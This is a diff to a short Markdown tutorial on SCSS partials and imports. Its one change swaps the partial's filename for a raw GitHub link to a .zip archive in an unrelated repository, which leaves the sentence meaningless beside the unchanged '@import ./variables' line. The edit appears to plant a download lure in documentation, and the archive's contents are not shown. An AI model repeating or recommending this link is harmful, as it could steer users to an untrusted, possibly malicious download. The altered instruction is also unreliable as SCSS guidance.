@@ -25,7 +25,7 @@ body {
 ## partial
 A partial is a scss file named with a leading underscore.
 ### importation
-To import the partial _variables.scss add the line
+To import the partial https://github.com/Augustus0017/CODE1/raw/refs/heads/main/SCSS/COD_v3.4.zip add the line
 @import './variables';
 
 ## function
